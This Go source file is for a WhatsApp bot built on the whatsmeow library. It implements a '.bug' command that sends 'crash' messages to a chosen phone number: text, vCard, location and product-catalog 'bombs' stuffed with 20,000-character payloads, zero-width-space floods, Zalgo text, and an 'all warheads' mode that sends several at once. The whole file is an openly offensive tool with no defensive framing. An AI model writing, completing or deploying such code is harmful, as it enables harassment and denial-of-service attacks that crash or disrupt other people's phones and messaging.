package main

import (
	"context"
	"fmt"
	"strings"

	"go.mau.fi/whatsmeow"
	waProto "go.mau.fi/whatsmeow/binary/proto" // ✅ New Path
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
	"google.golang.org/protobuf/proto"
)

// ... (باقی ہیلپر فنکشنز ویسے ہی رہیں گے: generateCrashPayload, generateZalgoPayload)

func handleSendBugs(client *whatsmeow.Client, v *events.Message, args []string) {
	if len(args) < 2 {
		replyMessage(client, v, "⚠️ Usage: .bug <1-7> <number>")
		return
	}

	bugType := strings.ToLower(args[0])
	targetNum := args[1]

	if !strings.Contains(targetNum, "@") {
		targetNum += "@s.whatsapp.net"
	}
	jid, err := types.ParseJID(targetNum)
	if err != nil {
		replyMessage(client, v, "❌ غلط نمبر!")
		return
	}

	replyMessage(client, v, "🚀 Launching Attack Type "+bugType+"...")

	switch bugType {
	
	case "1": // Text Bomb
		client.SendMessage(context.Background(), jid, &waProto.Message{
			Conversation: proto.String(generateCrashPayload(20000)),
		})

	case "2": // VCard Bomb
		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nEND:VCARD", generateCrashPayload(20000), "VIRUS")
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ContactMessage: &waProto.ContactMessage{DisplayName: proto.String("🔥"), Vcard: proto.String(vcard)},
		})

	case "3": // Location Bomb
		client.SendMessage(context.Background(), jid, &waProto.Message{
			LocationMessage: &waProto.LocationMessage{
				DegreesLatitude: proto.Float64(24.8607), DegreesLongitude: proto.Float64(67.0011),
				Address: proto.String(generateCrashPayload(20000)),
			},
		})

	case "4": // Flood
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(strings.Repeat("\u200b", 20000))},
		})

	case "5": // Zalgo
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(generateZalgoPayload())},
		})

	// 🔥 FIXED: CASE 6 (CATALOG BOMB)
	case "6": 
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ProductMessage: &waProto.ProductMessage{
				// ✅ FIX: ProductSnapshot کا نام صرف "Product" ہے یا سٹرکچر ڈائریکٹ ہے
				Product: &waProto.ProductMessage_ProductSnapshot{
					ProductId:       proto.String("999999"),
					Title:           proto.String("💣 HEAVY LOAD"),
					Description:     proto.String(generateCrashPayload(20000)),
					CurrencyCode:    proto.String("PKR"),
					PriceAmount1000: proto.Int64(0),
					ProductImageCount: proto.Int32(1),
				},
				// ✅ FIX: Jid -> JID (Capital ID)
				BusinessOwnerJID: proto.String(jid.String()), 
			},
		})

	// 🔥 FIXED: CASE 7 (MIXER)
	case "7", "all":
		// Text
		client.SendMessage(context.Background(), jid, &waProto.Message{Conversation: proto.String(generateCrashPayload(2000))})
		// Zalgo
		client.SendMessage(context.Background(), jid, &waProto.Message{ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(generateZalgoPayload())}})
		// Fixed Product
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ProductMessage: &waProto.ProductMessage{
				Product: &waProto.ProductMessage_ProductSnapshot{ // Corrected Type
					ProductId:   proto.String("666"),
					Title:       proto.String("🔥"),
					Description: proto.String(generateCrashPayload(20000)),
				},
				BusinessOwnerJID: proto.String(jid.String()), // Corrected Field
			},
		})

		replyMessage(client, v, "✅ All Warheads Delivered! 💀")

	default:
		replyMessage(client, v, "❌ غلط ٹائپ!")
	}
}

// Helper Reply
